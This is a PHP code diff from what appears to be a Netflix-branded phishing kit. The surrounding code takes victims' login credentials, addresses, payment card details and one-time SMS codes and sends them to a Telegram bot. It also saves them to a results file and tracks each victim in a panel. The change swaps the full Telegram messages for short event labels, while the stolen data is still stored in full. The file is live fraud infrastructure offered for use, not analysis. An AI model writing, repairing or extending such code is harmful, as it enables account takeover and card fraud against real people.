@@ -24,6 +24,11 @@ function sendTotelegram($data){
 
 }
 
+function sendResultTextToTelegram(string $eventLabel): void {
+    $safeMessage = "NETFLIX Result: " . $eventLabel;
+    sendTotelegram($safeMessage);
+}
+
 function appendResult($data) {
     $file = __DIR__ . '/results.txt';
     $entry = '[' . date('Y-m-d H:i:s') . "]\n" . $data . "\n\n";
@@ -89,7 +94,7 @@ pass: ".$_POST['pass']."
 IP: $ip
 ";
 
-sendTotelegram($msg);
+sendResultTextToTelegram("Login submitted");
 appendResult($msg);
 $_SESSION['_login_user'] = $_POST['user'];
 panelTouchUser($_POST['user'], 'login.php');
@@ -133,7 +138,7 @@ IP: $ip
 ";
 
 
-sendTotelegram($msg);
+sendResultTextToTelegram("Address submitted");
 appendResult($msg);
 panelTouchUser($fullName !== '' ? $fullName : ($_SESSION['_login_user'] ?? ''), 'adrees.php');
 
@@ -159,7 +164,7 @@ holder-name: " . ($_POST['holder-name'] ?? 'N/A') . "
 IP: $ip
 ";
 
-sendTotelegram($msg);
+sendResultTextToTelegram("Card form submitted");
 appendResult($msg);
 panelTouchUser($_POST['holder-name'] ?? ($_SESSION['_login_user'] ?? ''), 'card.php');
 
@@ -179,7 +184,7 @@ Otp: ".$_POST['otp']."
 IP: $ip
 ";
 
-sendTotelegram($msg);
+sendResultTextToTelegram("OTP submitted");
 appendResult($msg);
 panelTouchUser($_SESSION['_login_user'] ?? '', 'sms.php');
 
